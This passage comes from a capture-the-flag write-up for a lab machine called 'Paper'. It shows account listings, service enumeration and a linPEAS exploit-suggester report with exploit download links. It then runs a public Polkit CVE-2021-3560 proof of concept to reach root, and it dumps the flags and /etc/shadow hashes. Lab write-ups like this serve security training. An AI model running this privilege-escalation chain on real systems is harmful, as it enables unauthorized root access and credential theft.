+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+<span class="nb">sync</span>:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd:x:998:996:User <span class="k">for </span>polkitd:/:/sbin/nologin
+geoclue:x:997:994:User <span class="k">for </span>geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+cockpit-ws:x:996:993:User <span class="k">for </span>cockpit-ws:/:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+unbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+gluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+chrony:x:993:987::/var/lib/chrony:/sbin/nologin
+libstoragemgmt:x:992:986:daemon account <span class="k">for </span>libstoragemgmt:/var/run/lsm:/sbin/nologin
+saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+dnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+clevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+sssd:x:983:981:User <span class="k">for </span>sssd:/:/sbin/nologin
+colord:x:982:980:User <span class="k">for </span>colord:/var/lib/colord:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+setroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin
+pipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+gnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin
+insights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+mongod:x:976:974:mongod:/var/lib/mongo:/bin/false
+rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
+dwight:x:1004:1004::/home/dwight:/bin/bash
+</code></pre></div></div>
+
+<p>Enumerated local services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>dwight@paper Rocket.Chat]<span class="nv">$ </span>netstat <span class="nt">-polentau</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'WAIT|ESTABLISHED'</span>
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
+tcp        0      0 192.168.122.1:53        0.0.0.0:<span class="k">*</span>               LISTEN      0          37378      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          30043      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:48320         0.0.0.0:<span class="k">*</span>               LISTEN      1001       40366      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:8000          0.0.0.0:<span class="k">*</span>               LISTEN      1004       42932      2403/node            off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:33060         0.0.0.0:<span class="k">*</span>               LISTEN      27         34774      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:27017         0.0.0.0:<span class="k">*</span>               LISTEN      976        32842      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      27         38979      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      0          30054      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::443                  :::<span class="k">*</span>                    LISTEN      0          33812      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      0          33797      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:58176           0.0.0.0:<span class="k">*</span>                           70         29806      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 192.168.122.1:53        0.0.0.0:<span class="k">*</span>                           0          37377      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:67              0.0.0.0:<span class="k">*</span>                           0          37374      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 0.0.0.0:5353            0.0.0.0:<span class="k">*</span>                           70         29804      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp        0      0 127.0.0.1:323           0.0.0.0:<span class="k">*</span>                           0          27599      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 :::5353                 :::<span class="k">*</span>                                70         29805      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 :::46316                :::<span class="k">*</span>                                70         29807      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+udp6       0      0 ::1:323                 :::<span class="k">*</span>                                0          27600      -                    off <span class="o">(</span>0.00/0/0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Linepeas findings:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+...
+╔══════════╣ PATH                                                                                                                                                                                                                           
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
+/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                                                                                                                  
+New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
+...
+╔══════════╣ Executing Linux Exploit Suggester                                                                                                                                                                                              
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                                                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro                                                                                                                                                       
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit                                                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">mint</span><span class="o">=</span>19,ubuntu<span class="o">=</span>18|20, <span class="nv">debian</span><span class="o">=</span>10                                                                                                                                                                                                    
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                      
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,ubuntu<span class="o">=</span>14|16|17|18|19|20, <span class="nv">debian</span><span class="o">=</span>9|10                                                                                                                                                                                 
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html                                                                                                                                               
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>                                                                                                                                                                                                       
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c                                                                                                                      
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c                                                                                                                                        
+   Comments: ip_tables kernel module must be loaded                                                                                                                                                                                         
+                                                                                                                                                                                                                                            
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-18634] <span class="nb">sudo </span>pwfeedback                                                                                                                                                                                                        
+                                                                                                                                                                                                                                            
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/                                                                                                                                                                               
+   Exposure: less probable                                                                                                                                                                                                                  
+   Tags: <span class="nv">mint</span><span class="o">=</span>19                                                                                                                                                                                                                            
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c                                                                                                                                                   
+   Comments: <span class="nb">sudo </span>configuration requires pwfeedback to be enabled.                                                                                                                                                                          
+
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL: 
+   Comments: CONFIG_USER_NS needs to be enabled<span class="p">;</span> CONFIG_XFRM needs to be enabled
+
+<span class="o">[</span>+] <span class="o">[</span>CVE-2019-13272] PTRACE_TRACEME
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span>1903
+   Exposure: less probable
+   Tags: <span class="nv">ubuntu</span><span class="o">=</span>16.04<span class="o">{</span>kernel:4.15.0-<span class="k">*</span><span class="o">}</span>,ubuntu<span class="o">=</span>18.04<span class="o">{</span>kernel:4.15.0-<span class="k">*</span><span class="o">}</span>,debian<span class="o">=</span>9<span class="o">{</span>kernel:4.9.0-<span class="k">*</span><span class="o">}</span>,debian<span class="o">=</span>10<span class="o">{</span>kernel:4.19.0-<span class="k">*</span><span class="o">}</span>,fedora<span class="o">=</span>30<span class="o">{</span>kernel:5.0.9-<span class="k">*</span><span class="o">}</span>
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+   Comments: Requires an active PolKit agent.
+...
+</code></pre></div></div>
+
+<h2 id="polkit-privilege-escalation-cve-2021-3560">Polkit Privilege Escalation (CVE-2021-3560)</h2>
+
+<p><a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a></p>
+
+<p>Executed the PoC and elevated to root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>dwight@paper shm]<span class="nv">$ </span>./poc.sh <span class="nt">-u</span><span class="o">=</span>maoutis <span class="nt">-p</span><span class="o">=</span>maoutis
+
+<span class="o">[!]</span> Username <span class="nb">set </span>as : maoutis
+<span class="o">[!]</span> No Custom Timing specified.
+<span class="o">[!]</span> Timing will be detected Automatically
+<span class="o">[!]</span> Force flag not set.
+<span class="o">[!]</span> Vulnerability checking is ENABLED!
+<span class="o">[!]</span> Starting Vulnerability Checks...
+<span class="o">[!]</span> Checking distribution...
+<span class="o">[!]</span> Detected Linux distribution as <span class="s2">"centos"</span>
+<span class="o">[!]</span> Checking <span class="k">if </span>Accountsservice and Gnome-Control-Center is installed
+<span class="o">[</span>+] Accounts service and Gnome-Control-Center Installation Found!!
+<span class="o">[!]</span> Checking <span class="k">if </span>polkit version is vulnerable
+<span class="o">[</span>+] Polkit version appears to be vulnerable!!
+<span class="o">[!]</span> Starting exploit...
+<span class="o">[!]</span> Inserting Username maoutis...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+<span class="o">[</span>+] Inserted Username maoutis  with UID 1005!
+<span class="o">[!]</span> Inserting password hash...
+<span class="o">[!]</span> It looks like the password insertion was succesful!
+<span class="o">[!]</span> Try to login as the injected user using su - maoutis
+<span class="o">[!]</span> When prompted <span class="k">for </span>password, enter your password
+<span class="o">[!]</span> If the username is inserted, but the login fails<span class="p">;</span> try running the exploit again.
+<span class="o">[!]</span> If the login was succesful,simply enter <span class="s1">'sudo bash'</span> and drop into a root shell!
+<span class="o">[</span>dwight@paper shm]<span class="nv">$ </span>su maoutis
+Password:
+<span class="o">[</span>maoutis@paper shm]<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1005<span class="o">(</span>maoutis<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>
+<span class="o">[</span>maoutis@paper shm]<span class="nv">$ </span><span class="nb">sudo </span>bash
+
+We trust you have received the usual lecture from the <span class="nb">local </span>System
+Administrator. It usually boils down to these three things:
+
+    <span class="c">#1) Respect the privacy of others.</span>
+    <span class="c">#2) Think before you type.</span>
+    <span class="c">#3) With great power comes great responsibility.</span>
+
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>maoutis:
+<span class="o">[</span>root@paper shm]# <span class="nb">id</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> ip a<span class="p">;</span> <span class="nb">cat</span> /root/root.txt
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+paper
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:68:99 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:6899/64 scope global dynamic mngtmpaddr
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb9:6899/64 scope <span class="nb">link
+       </span>valid_lft forever preferred_lft forever
+3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+    <span class="nb">link</span>/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
+       valid_lft forever preferred_lft forever
+4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000
+    <span class="nb">link</span>/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+c268c00c67c62ae24f54749c8469fd03
+</code></pre></div></div>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%2012.png" alt="Untitled" /></p>
+
+<h1 id="trophy">Trophy</h1>
+
+<p><img src="/assets/images/Screenshots/Paper/Untitled%2013.png" alt="Untitled" /></p>
+
+<p><strong>User.txt</strong></p>
+
+<p>83482a8c2adcc4a365993c3653dc9517</p>
+
+<p><strong>Root.txt</strong></p>
+
+<p>c268c00c67c62ae24f54749c8469fd03</p>
+
+<p><strong>/etc/shadow</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@paper shm]# <span class="nb">cat</span> /etc/shadow | <span class="nb">grep</span> <span class="s1">'\$'</span>
+root:<span class="nv">$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3</span>/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7:::
+dwight:<span class="nv">$6$xVlcDig</span>.sohk9jK0<span class="nv">$BZEhwP6SZytZTTAMTqjb35j02yMHq</span>/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::
+</code></pre></div></div>
+
+<style>
+.share {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+</style>
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs>
+    <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol>
+    <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol>
+    <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol>
+    <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol>
+    <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol>
+    <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol>
+    <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol>
+    <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol>
+    <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol>
+    <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol>
+    <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol>
+    <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562
+		C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563
+		h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243
+		C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982
+		c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379
+		c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379
+		C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416
+		c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575
+		H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685
+		c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38
